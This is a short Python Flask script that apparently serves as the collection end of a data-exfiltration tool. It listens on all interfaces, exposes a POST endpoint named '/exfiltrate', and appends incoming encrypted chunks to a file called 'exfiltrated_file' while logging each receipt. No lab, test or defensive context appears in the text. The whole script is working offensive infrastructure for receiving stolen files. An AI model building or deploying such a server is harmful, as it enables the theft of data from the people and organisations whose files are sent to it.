from flask import Flask, request, jsonify
import os
import logging

# Set up server IP and port using environment variables
server_ip = os.getenv('SERVER_IP', '0.0.0.0')  # Listen on all interfaces by default
server_port = os.getenv('SERVER_PORT', '5001')  # Default port is 5001

# Logging setup
logging.basicConfig(filename='logs/server.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)

@app.route('/exfiltrate', methods=['POST'])
def receive_file():
    encrypted_data = request.data
    logging.info(f"Received file data (first 64 bytes): {encrypted_data[:64]}...")  # Log a sample for debugging

    # Simulating file handling process
    try:
        with open("uploads/exfiltrated_file", 'ab') as f:
            f.write(encrypted_data)
        logging.info("File exfiltration completed successfully.")
        return jsonify({'status': 'chunk_received'})
    except Exception as e:
        logging.error(f"Error processing file: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    # Run the Flask server with dynamically set IP and port
    logging.info(f"Starting server at {server_ip}:{server_port}")
    app.run(host=server_ip, port=int(server_port))
